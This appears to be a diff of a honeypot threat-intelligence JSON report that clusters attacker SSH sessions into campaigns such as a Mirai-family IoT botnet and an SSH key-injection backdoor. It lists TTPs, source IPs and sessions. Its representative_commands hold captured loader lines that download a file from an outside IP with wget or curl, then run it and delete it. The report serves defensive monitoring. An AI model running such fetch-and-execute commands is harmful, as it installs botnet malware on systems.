@@ -1,22 +1,48 @@
 {
-  "generated_at": "2026-08-25T10:36:21.657899+00:00",
-  "total_sessions_with_commands": 103,
-  "total_clusters": 3,
-  "campaign_clusters": 1,
-  "singleton_clusters": 2,
-  "highest_severity": "MEDIUM",
+  "generated_at": "2026-08-25T12:52:57.151797+00:00",
+  "total_sessions_with_commands": 214,
+  "total_clusters": 4,
+  "campaign_clusters": 3,
+  "singleton_clusters": 1,
+  "highest_severity": "HIGH",
   "active_campaigns": [
     {
       "cluster_id": "CLU-001",
-      "name": "Recon Loader Script",
-      "severity": "MEDIUM",
-      "session_count": 101,
+      "name": "Mirai/IoT Botnet",
+      "severity": "HIGH",
+      "session_count": 1,
       "unique_ip_count": 1,
       "ttps": [
-        "T1082",
-        "T1592",
+        "T1105",
+        "T1070",
+        "T1140",
+        "T1059.004"
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
+      "name": "mdrfckr SSH Key Injection",
+      "severity": "HIGH",
+      "session_count": 2,
+      "unique_ip_count": 2,
+      "ttps": [
+        "T1021.004",
         "T1078",
-        "T1083"
+        "T1070",
+        "T1140",
+        "T1105"
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
+      "name": "Mirai/IoT Botnet",
+      "severity": "HIGH",
+      "session_count": 209,
+      "unique_ip_count": 1,
+      "ttps": [
+        "T1105",
+        "T1140",
+        "T1059.004"
       ]
     }
   ],
@@ -24,23 +50,10 @@
     {
       "cluster_id": "CLU-001",
       "is_campaign": true,
-      "campaign_name": "Recon Loader Script",
-      "campaign_severity": "MEDIUM",
-      "campaign_description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
+      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
       "matched_campaigns": [
-        {
-          "name": "Recon Loader Script",
-          "ttps": [
-            "T1078",
-            "T1083",
-            "T1592",
-            "T1082"
-          ],
-          "severity": "MEDIUM",
-          "description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-          "pattern_hits": 3,
-          "pattern_total": 6
-        },
         {
           "name": "Mirai/IoT Botnet",
           "ttps": [
@@ -53,882 +66,122 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 101,
+      "session_count": 1,
       "unique_ips": [
-        "2.57.122.150"
+        "45.198.224.26"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "d2ac04915390abe8",
+      "sequence_hash": "18bc48b47c351ba6",
       "ttps": [
         {
-          "id": "T1082",
-          "name": "System Information Discovery"
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
         },
         {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
+          "id": "T1070",
+          "name": "Indicator Removal"
         },
         {
-          "id": "T1078",
-          "name": "T1078"
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
         },
         {
-          "id": "T1083",
-          "name": "T1083"
+          "id": "T1059.004",
+          "name": "T1059.004"
         }
       ],
       "representative_commands": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una",
-        "uname -s -v -n -m 2 > /dev/null",
-        "/bin/uname -s -v -n -m 2 > /dev/null",
-        "/usr/bin/uname -s -v -n -m 2 > /dev/null",
-        "busybox uname -s -v -n -m 2 > /dev/null",
-        "( [ -f /proc/version ]",
-        "[ -f /proc/version ]",
-        "head -1 /proc/version | cut -d -f1",
-        "[ -f /etc/os-release ]"
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &",
+        "cd /tmp",
+        "wget http://5.182.210.174/ok",
+        "curl -O http://5.182.210.174/ok",
+        "chmod +x ok",
+        "sh ok",
+        "rm -rf ok",
+        "rm -rf ok.1",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/bin/wget http://5.182.210.174/ok;curl -O http://5.182.210.174/ok;busybox curl -O http://5.182.210.174/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &",
+        "cd /tmp"
       ],
       "members": [
         {
-          "session_id": "IR-42d386e1ea0d",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T06:55:32.225537Z"
-        },
-        {
-          "session_id": "IR-4c22df6fd9a7",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T06:56:43.665265Z"
-        },
-        {
-          "session_id": "IR-6d1fcab3bb7e",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T06:57:54.514081Z"
-        },
-        {
-          "session_id": "IR-f7c54472fcc4",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T06:59:04.911324Z"
-        },
-        {
-          "session_id": "IR-24fda02e58e3",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:00:15.104037Z"
-        },
-        {
-          "session_id": "IR-9c894c3e6072",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:01:22.467611Z"
-        },
-        {
-          "session_id": "IR-1207bc21e9b1",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:02:28.873548Z"
-        },
-        {
-          "session_id": "IR-50493458553c",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:03:36.016771Z"
-        },
-        {
-          "session_id": "IR-a9f7ccd87f0b",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:04:42.355114Z"
-        },
-        {
-          "session_id": "IR-b5499c12f74a",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:05:46.342325Z"
-        },
-        {
-          "session_id": "IR-d7cd2bfa35e8",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:06:52.275047Z"
-        },
-        {
-          "session_id": "IR-454cfb7b3e9a",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:08:01.011555Z"
-        },
-        {
-          "session_id": "IR-79b33ede2bba",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:09:09.760370Z"
-        },
-        {
-          "session_id": "IR-c3de4ac5d3dd",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:10:23.990463Z"
-        },
-        {
-          "session_id": "IR-5425d033ead1",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:11:38.891001Z"
-        },
-        {
-          "session_id": "IR-9832faba69d4",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:12:42.999148Z"
-        },
-        {
-          "session_id": "IR-cacb95088f47",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:13:45.802989Z"
-        },
-        {
-          "session_id": "IR-fa4e0806054b",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:14:48.815820Z"
-        },
-        {
-          "session_id": "IR-fb9693a2054d",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:15:50.864574Z"
-        },
-        {
-          "session_id": "IR-594c624fcd9f",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:16:51.169953Z"
-        },
-        {
-          "session_id": "IR-516afcabe563",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:17:54.356315Z"
-        },
-        {
-          "session_id": "IR-8b1a7ac754e6",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:19:01.262885Z"
-        },
-        {
-          "session_id": "IR-9717889c57e2",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:20:10.232525Z"
-        },
-        {
-          "session_id": "IR-61a6a0a55608",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:21:23.558019Z"
-        },
-        {
-          "session_id": "IR-11c4c2751ba6",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:22:36.818160Z"
-        },
-        {
-          "session_id": "IR-805e5a9d68da",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:23:40.591659Z"
-        },
-        {
-          "session_id": "IR-c4213df38f00",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:24:44.051301Z"
-        },
-        {
-          "session_id": "IR-db64752c2ae5",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:25:47.497187Z"
-        },
-        {
-          "session_id": "IR-3815dff08756",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:26:52.497959Z"
-        },
-        {
-          "session_id": "IR-b7e23ab26f7a",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:28:00.202158Z"
-        },
-        {
-          "session_id": "IR-24af3f51bf04",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:29:13.140327Z"
-        },
-        {
-          "session_id": "IR-e9fe5ca64c86",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:30:29.562037Z"
-        },
-        {
-          "session_id": "IR-92b26c1fa472",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:31:41.377799Z"
-        },
-        {
-          "session_id": "IR-0f6c329be54d",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:32:43.456776Z"
-        },
-        {
-          "session_id": "IR-9b84f4b6cb68",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:33:44.186000Z"
-        },
-        {
-          "session_id": "IR-e44a24208ddc",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:34:44.163208Z"
-        },
-        {
-          "session_id": "IR-c5301afc779b",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:35:43.735558Z"
-        },
-        {
-          "session_id": "IR-274d2459b35e",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:36:45.294642Z"
-        },
-        {
-          "session_id": "IR-73c2f9ab8759",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:37:51.126666Z"
-        },
-        {
-          "session_id": "IR-422e17a26c3f",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:38:59.641054Z"
-        },
-        {
-          "session_id": "IR-fa122a225469",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:40:10.214376Z"
-        },
-        {
-          "session_id": "IR-c86063f89445",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:41:24.715633Z"
-        },
-        {
-          "session_id": "IR-171477f114d4",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:42:46.506502Z"
-        },
-        {
-          "session_id": "IR-3a087a2a3cea",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:43:55.664548Z"
-        },
-        {
-          "session_id": "IR-6fb3558fe313",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:44:56.420632Z"
-        },
-        {
-          "session_id": "IR-c51ce6368fd4",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:45:55.679154Z"
-        },
-        {
-          "session_id": "IR-cbc077f94e2f",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:46:54.555105Z"
-        },
-        {
-          "session_id": "IR-59716c02d6ab",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:47:53.867741Z"
-        },
-        {
-          "session_id": "IR-6b11e6db00e0",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:48:55.035135Z"
-        },
-        {
-          "session_id": "IR-7c00e3683a4d",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:49:58.747139Z"
-        },
-        {
-          "session_id": "IR-58d1379cd928",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:51:06.575284Z"
-        },
-        {
-          "session_id": "IR-ed302b761aab",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:52:17.072004Z"
-        },
-        {
-          "session_id": "IR-c09df82ffd7c",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:53:28.226775Z"
-        },
-        {
-          "session_id": "IR-38bbdceec0b8",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:54:41.805926Z"
-        },
-        {
-          "session_id": "IR-5afbddba730b",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:55:58.925261Z"
-        },
-        {
-          "session_id": "IR-d6c9b9b02d0a",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:57:13.531550Z"
-        },
-        {
-          "session_id": "IR-5d9a23b6cef8",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:58:15.051225Z"
-        },
-        {
-          "session_id": "IR-ffbbe6fb0b50",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T07:59:12.431255Z"
-        },
-        {
-          "session_id": "IR-1ccd1ced4d31",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:00:10.330646Z"
-        },
-        {
-          "session_id": "IR-c699866c4a5b",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:01:09.803304Z"
-        },
-        {
-          "session_id": "IR-b8e463760275",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:02:11.185643Z"
-        },
-        {
-          "session_id": "IR-e46605b70f7d",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:03:14.078829Z"
-        },
-        {
-          "session_id": "IR-21ab45c61f7e",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:04:17.908292Z"
-        },
-        {
-          "session_id": "IR-c095c44e3314",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:05:22.656074Z"
-        },
-        {
-          "session_id": "IR-77253d4ca357",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:06:26.652840Z"
-        },
-        {
-          "session_id": "IR-b09c8c597523",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:07:33.641688Z"
-        },
-        {
-          "session_id": "IR-040c317576e1",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:08:43.518160Z"
-        },
-        {
-          "session_id": "IR-fdd6e98f110a",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:09:54.120721Z"
-        },
-        {
-          "session_id": "IR-d93ea634ebc1",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:11:05.551409Z"
-        },
-        {
-          "session_id": "IR-80590a9fdee8",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:12:16.089486Z"
-        },
-        {
-          "session_id": "IR-e73b7ac0331d",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:13:28.199820Z"
-        },
-        {
-          "session_id": "IR-0ece2d1053a9",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:14:40.480608Z"
-        },
-        {
-          "session_id": "IR-da10c23f429f",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:15:48.538051Z"
-        },
-        {
-          "session_id": "IR-a4a187480f53",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:16:55.305002Z"
-        },
-        {
-          "session_id": "IR-4c1c1bf90a01",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:18:04.425470Z"
-        },
-        {
-          "session_id": "IR-ed4592bec6de",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:19:13.684978Z"
-        },
-        {
-          "session_id": "IR-b0ddef8a4898",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:20:28.315235Z"
-        },
-        {
-          "session_id": "IR-54b80b9116c0",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:21:46.002639Z"
-        },
-        {
-          "session_id": "IR-b6d00b94e5f9",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:23:05.103276Z"
-        },
-        {
-          "session_id": "IR-a415b38e3ef4",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:24:25.233398Z"
-        },
-        {
-          "session_id": "IR-e64ee24ffdde",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:25:40.010106Z"
-        },
-        {
-          "session_id": "IR-ebfd3814ec9e",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:26:42.398952Z"
-        },
-        {
-          "session_id": "IR-3f4c6923a89e",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:27:44.222042Z"
-        },
-        {
-          "session_id": "IR-29f8d9763f32",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:28:48.028235Z"
-        },
-        {
-          "session_id": "IR-5b07a198b04e",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:29:54.309447Z"
-        },
-        {
-          "session_id": "IR-47634ba5ad13",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:31:04.325255Z"
-        },
-        {
-          "session_id": "IR-b57f009c39fa",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:32:17.541783Z"
-        },
-        {
-          "session_id": "IR-fc54f21d93db",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:33:32.743452Z"
-        },
-        {
-          "session_id": "IR-869fd5332b9f",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:34:51.829571Z"
-        },
-        {
-          "session_id": "IR-8efbcfb20ddc",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:36:10.434947Z"
-        },
-        {
-          "session_id": "IR-9a826bf204c4",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:37:25.237817Z"
-        },
-        {
-          "session_id": "IR-82b938738607",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:38:37.184563Z"
-        },
-        {
-          "session_id": "IR-a70f1eac5d2e",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:39:51.294723Z"
-        },
-        {
-          "session_id": "IR-946be245d056",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:41:09.091884Z"
-        },
-        {
-          "session_id": "IR-703f0ebea384",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:42:26.571398Z"
-        },
-        {
-          "session_id": "IR-309726974c98",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:43:44.113266Z"
-        },
-        {
-          "session_id": "IR-1a93ba074cf2",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:45:00.212127Z"
-        },
-        {
-          "session_id": "IR-972d20ed7760",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:46:18.240721Z"
-        },
-        {
-          "session_id": "IR-dcc02efa01f0",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:47:36.420162Z"
-        },
-        {
-          "session_id": "IR-c8d5ae6ff38b",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:48:51.803316Z"
-        },
-        {
-          "session_id": "IR-c15347616e54",
-          "src_ip": "2.57.122.150",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-08-25T08:50:06.680454Z"
+          "session_id": "IR-298decb08369",
+          "src_ip": "45.198.224.26",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 24,
+          "timestamp": "2026-08-25T10:02:21.579554Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-002",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "130.12.180.51"
+      "is_campaign": true,
+      "campaign_name": "mdrfckr SSH Key Injection",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+      "matched_campaigns": [
+        {
+          "name": "mdrfckr SSH Key Injection",
+          "ttps": [
+            "T1021.004",
+            "T1078",
+            "T1105"
+          ],
+          "severity": "HIGH",
+          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+          "pattern_hits": 3,
+          "pattern_total": 3
+        }
       ],
-      "unique_ip_count": 1,
